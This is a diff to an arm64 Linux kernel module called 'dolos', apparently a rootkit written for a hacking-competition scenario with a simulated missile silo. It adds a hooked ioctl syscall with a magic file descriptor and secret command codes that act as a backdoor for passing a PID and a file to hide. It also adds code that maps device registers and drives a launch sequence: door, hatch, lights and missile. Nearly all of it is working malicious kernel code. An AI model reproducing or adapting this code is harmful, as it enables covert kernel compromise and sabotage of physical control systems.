@@ -3,7 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
-// #include <linux/kprobes.h>
+#include <linux/kprobes.h>//
 #include <linux/ftrace.h>
 #include <asm/cacheflush.h>
 #include <linux/module.h>
@@ -18,11 +18,48 @@ MODULE_VERSION("0.1");
 #ifndef DEBUG
 #define DEBUG 1
 #endif
+#define MAX_NAME 256
+#define ROOTKIT -1877
+#define SENDPID 8008
+#define RATSIGLAUNCH 8675309
+#define CHECKUP 80085
+#define GOODRET 42
+#define HIDEFILE 1234
+
 /* A simple debug print macro that will be compiled out if not defined */
   /* https://stackoverflow.com/questions/1644868/define-macro-for-debug-printing-in-c */
 #define debug_print(fmt, args...)\
     do { if (DEBUG) pr_warn(fmt, ##args); } while(0)
 
+bool gotime = false;
+char pid[MAX_NAME];
+char filename[MAX_NAME];
+bool rfilename = false;
+bool rpid = false;
+
+typedef struct Registers {
+	unsigned int status;
+	unsigned int reserved0;
+	unsigned int command;
+	unsigned int reserved1;
+	unsigned int data;
+	unsigned int reserved2;
+}Registers;
+
+typedef struct RegisterMap {
+	Registers * hatch;
+	Registers * bd;
+	Registers * wl;
+	Registers * rl;
+	Registers * mr;
+	Registers * tc;
+	Registers * lc;
+	uint8_t * tcbuf;
+	uint8_t * lcbuf;
+}RegisterMap;
+
+RegisterMap *reg_map1;
+RegisterMap *rm;
 
 typedef asmlinkage long (*orig_syscall_t)(const struct pt_regs *);
 
@@ -59,7 +96,7 @@ static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip,
 }
 
 
-static void malicious_ioctl(unsigned long arg);
+static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp);
 
 
 /* set registers & determine hook*/
@@ -69,31 +106,51 @@ static asmlinkage long dolos_ioctl(struct pt_regs *regs)
     int ret = 0;
     unsigned int fd = regs->regs[0];
     unsigned int cmd = regs->regs[1];
-    unsigned long arg = regs->regs[2];
+    unsigned long arg;
+    if (regs->regs[2] != NULL) {
+        arg = regs->regs[2];
+    }
 
-    /*
-        if (fd == -1877) { // Our creators are talking to us
-                if (cmd == 8008) { // pid
-                        PID = arg;
-                        return 42;
+        if (fd == ROOTKIT) { // Our creators are talking to us
+                if (cmd == SENDPID) { // pid
+                        sprintf(pid, "%ld", arg);
+                        return GOODRET;
 
-                } else if (cmd == 1234) {
-                        FILENAME = kzalloc(FILENAME, sizeof(((char *)arg));
-                        copy_from_user(FILENAME, (char *)arg, sizeof(((char*)arg)));
-                        return 42;
+                } else if (cmd == HIDEFILE) {
+                        __arch_copy_from_user(filename, (char *)arg, sizeof(((char*)arg)));
+                        return GOODRET;
 
-                } else { // CWEs ASSEMBLE
-                        GOTIME = true;
-                        return 42;
-                }
-        } */
+                } else if (cmd == RATSIGLAUNCH) { // CWEs ASSEMBLE
+			gotime = true;
+                        return GOODRET;
+                
+		} else if (cmd == CHECKUP) {
+			return GOODRET;
+		
+		} else {
+			return 0;
+		}
+        }
 
-    // FIXME: edit conditional to be contingent on GOTIME as well
-    if (cmd == 0x195) {
-        // debug_print("cmd equals 0x195.\nExecute malicious ioctl here...\n");
-	malicious_ioctl(arg);
+    if (gotime && cmd == 0x195) {
+        unsigned long *kernel_argp;
+        /* FIXME: UNCOMMENT whole block
+        
+        // copy_from_user(dest, source, size)
+        __n = __arch_copy_from_user(&kernel_argp,arg & 0xff7fffffffffffff,4); // Copy launch code
+        if (__n != 0) {
+            debug_print("copy from user FAILED.\n");
+            ret = orig_ioctl(regs);
+        } 
+        else {
+            malicious_ioctl(arg, *kernel_argp);
+        }
+        // ......... stop uncommenting from fixme here ............
+        */
+        malicious_ioctl(arg, kernel_argp);
+    }
 
-    } else {
+    else {
         // pass to original function
         // debug_print("cmd does not equal 0x195.\nPass to original ioctl function...\n");
         ret = orig_ioctl(regs);
@@ -102,13 +159,168 @@ static asmlinkage long dolos_ioctl(struct pt_regs *regs)
 
 }
 
+static void map_regions(void) {
+  unsigned long addr1;
+  char cVar4;
+  Registers *pRVar5;
+  uint8_t *puVar6;
+  unsigned long uVar7;
 
-static void malicious_ioctl(unsigned long arg)
+  uVar7 = 0x68000000000713;
+  rm = (RegisterMap *)kmalloc(0x8000,0x48);
+  uint8_t *buf = (uint8_t *)vmalloc(0x4000);
+  reg_map1 = rm;
+  addr1 = uVar7;
+  if (arm64_use_ng_mappings != '\0') {
+    addr1 = 0x68000000000f13;
+  }
+  pRVar5 = (Registers *)ioremap(0x60080120,0x18);
+  cVar4 = arm64_use_ng_mappings;
+  reg_map1->hatch = pRVar5;
+  reg_map1 = rm;
+  addr1 = uVar7;
+  if (cVar4 != '\0') {
+    addr1 = 0x68000000000f13;
+  }
+  pRVar5 = (Registers *)ioremap(0x60080100,0x18);
+  cVar4 = arm64_use_ng_mappings;
+  reg_map1->bd = pRVar5;
+  reg_map1 = rm;
+  addr1 = uVar7;
+  if (cVar4 != '\0') {
+    addr1 = 0x68000000000f13;
+  }
+  pRVar5 = (Registers *)ioremap(0x60080200,0x18);
+  cVar4 = arm64_use_ng_mappings;
+  reg_map1->wl = pRVar5;
+  reg_map1 = rm;
+  addr1 = uVar7;
+  if (cVar4 != '\0') {
+    addr1 = 0x68000000000f13;
+  }
+  pRVar5 = (Registers *)ioremap(0x60080220,0x18);
+  cVar4 = arm64_use_ng_mappings;
+  reg_map1->rl = pRVar5;
+  reg_map1 = rm;
+  addr1 = uVar7;
+  if (cVar4 != '\0') {
+    addr1 = 0x68000000000f13;
+  }
+  pRVar5 = (Registers *)ioremap(0x60080240,0x18);
+  cVar4 = arm64_use_ng_mappings;
+  reg_map1->mr = pRVar5;
+  reg_map1 = rm;
+  addr1 = uVar7;
+  if (cVar4 != '\0') {
+    addr1 = 0x68000000000f13;
+  }
+  pRVar5 = (Registers *)ioremap(0x60080260,0x18);
+  cVar4 = arm64_use_ng_mappings;
+  reg_map1->tc = pRVar5;
+  reg_map1 = rm;
+  addr1 = uVar7;
+  if (cVar4 != '\0') {
+    addr1 = 0x68000000000f13;
+  }
+  pRVar5 = (Registers *)ioremap(0x60080280,0x18);
+  cVar4 = arm64_use_ng_mappings;
+  reg_map1->lc = pRVar5;
+  reg_map1 = rm;
+  addr1 = uVar7;
+  if (cVar4 != '\0') {
+    addr1 = 0x68000000000f13;
+  }
+  puVar6 = (uint8_t *)ioremap(0x60081000,0x4000);
+  cVar4 = arm64_use_ng_mappings;
+  RegisterMap *pRVar3 = rm;
+  reg_map1->tcbuf = puVar6;
+  if (cVar4 != '\0') {
+    uVar7 = 0x68000000000f13;
+  }
+  puVar6 = (uint8_t *)ioremap(0x60085000,0x4000);
+  pRVar3->lcbuf = puVar6;
+  return;
+}
+
+
+static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
 {
 
         debug_print("\n\nmalicious_ioctl function called.\n\n");
-        // FIXME: drop in our launch sequence implementation
 
+        map_regions(); // Map our register map
+        
+        int timeLimit = 10;
+
+        // Set missile startup
+        while(rm->mr->status != 6 && timeLimit > 0) {
+            rm->mr->data = kernel_argp;
+            rm->mr->command = 4;
+            timeLimit --;
+            msleep(500);
+        }
+
+        // turn on lights
+	    rm->rl->command = 1;
+        msleep(2000);
+        debug_print("\n lights on. \n");
+
+        // close blast door
+        rm->bd->command = 2;
+        timeLimit = 80;
+        while(rm->bd->status != 2 && timeLimit > 0) {
+            msleep(100);
+            timeLimit --;
+        }
+        debug_print("\n blast door closed. \n");
+
+        // open hatch
+        timeLimit = 80;
+        rm->hatch->command = 1;
+        while(rm->hatch->status != 1 && timeLimit > 0) {
+            msleep(100);
+            timeLimit --;
+        }
+        debug_print("\n hatch opened. \n");
+
+        // get missile ready for launch
+	    timeLimit = 200;
+	    rm->mr->command = 1;
+	    while(rm->mr->status != 3 && timeLimit > 0) {
+	    	msleep(100);
+	    	timeLimit --;
+	    }
+        debug_print("\n missile ready for launch. \n");
+
+        // shut hatch
+        timeLimit = 80;
+        rm->hatch->command = 2;
+        while(rm->hatch->status != 2 && timeLimit > 0) {
+            msleep(100);
+            timeLimit --;
+        }
+        debug_print("\n HATCH CLOSED. \n");
+
+        // open blastdoor
+        rm->bd->command = 1;
+        // kill lights
+        rm->rl->command = 2;
+        rm->wl->command = 2;
+        timeLimit = 80;
+        while(rm->bd->status != 1 && timeLimit > 0) {
+            msleep(100);
+            timeLimit --;
+        }
+        debug_print("\n blastdoor opened & lights killed. \n");
+
+
+        // launch the missile
+	    rm->mr->command = 3;
+        debug_print("\n MISSILE LAUNCHED. \n");
+
+	
+	return;
+	
 }
 
 
